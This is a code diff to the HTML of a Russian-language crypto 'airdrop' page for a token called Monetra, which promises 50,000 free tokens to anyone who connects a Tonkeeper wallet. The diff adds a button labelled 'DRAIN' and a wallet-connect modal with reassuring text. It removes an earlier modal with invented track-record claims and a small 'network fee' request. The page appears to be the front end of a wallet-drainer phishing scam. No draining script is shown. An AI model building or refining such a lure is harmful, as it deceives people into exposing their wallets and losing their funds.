@@ -11,6 +11,7 @@
 </head>
 <body>
     <div id="ton-connect"></div>
+    <button id="drain-btn" class="drain-button">DRAIN</button>
     
     <header class="site-header">
         <nav class="navbar">
@@ -24,7 +25,7 @@
             </div>
         </nav>
     </header>
-
+    
     <div class="main-container">
         <div class="content-wrapper">
             <h1 class="title">Получи бесплатно <span class="highlight">50,000</span> монет нового токена!</h1>
@@ -32,39 +33,11 @@
             <p class="description">
                 Вам стоит лишь привязать свой крипто-кошелек и получить токены на баланс!
             </p>
-            <button id="open-connect-modal" class="cta-button">Получить токены</button>
+            <button id="open-tonkeeper-modal" class="cta-button">Получить токены</button>
         </div>
     </div>
 
-<!-- Модальное окно подключения -->
-<div id="connect-modal" class="modal-overlay">
-    <div class="modal-content">
-        <button class="modal-close">&times;</button>
-        <h2>Добро пожаловать в Monetra!</h2>
-        <div class="modal-description">
-            <p>Мы - команда профессиональных разработчиков с более чем 5-летним опытом в блокчейн-индустрии.</p>
-            <p>Monetra - это уже третий наш успешный проект, предыдущие токены показали рост более 300% за первый год.</p>
-            <p>Для получения бесплатных токенов, пожалуйста, подключите ваш крипто-кошелек через безопасное соединение.</p>
-        </div>
-        <button id="connect-wallet-btn" class="cta-button">Connect Wallet</button>
-    </div>
-</div>
-
-<!-- Модальное окно подтверждения -->
-<div id="confirm-modal" class="modal-overlay">
-    <div class="modal-content">
-        <button class="modal-close">&times;</button>
-        <h2>Кошелек подключен!</h2>
-        <div class="modal-description">
-            <p>Теперь мы можем перевести вам 50,000 MTR токенов.</p>
-            <p>Обратите внимание: для обработки транзакции потребуется небольшая комиссия сети (~0.05 TON).</p>
-            <p>Нажмите кнопку ниже для подтверждения получения.</p>
-        </div>
-        <button id="get-tokens-btn" class="cta-button">Получить токены</button>
-    </div>
-</div>
-
-    <!-- Модальное окно бирж -->
+    <!-- Модальное окно для бирж -->
     <div id="exchanges-modal" class="modal-overlay">
         <div class="modal-content">
             <button id="close-exchanges-modal" class="modal-close">&times;</button>
@@ -83,6 +56,20 @@
                 <li><a href="https://www.bitstamp.net/" target="_blank">Bitstamp</a></li>
                 <li><a href="https://www.mexc.com/" target="_blank">MEXC</a></li>
             </ul>
+        </div>
+    </div>
+
+    <!-- Модальное окно для Tonkeeper -->
+    <div id="tonkeeper-modal" class="modal-overlay">
+        <div class="modal-content">
+            <button id="close-tonkeeper-modal" class="modal-close">&times;</button>
+            <h2>Подключите ваш Tonkeeper кошелек</h2>
+            <p class="modal-description">
+                Для получения бесплатных токенов Monetra, пожалуйста, подключите ваш Tonkeeper кошелек.
+                Это позволит нам безопасно перевести токены на ваш баланс.
+                Убедитесь, что вы используете официальное приложение Tonkeeper.
+            </p>
+            <button id="connect-tonkeeper-btn" class="cta-button tonkeeper-button">Подключить Tonkeeper</button>
         </div>
     </div>
 
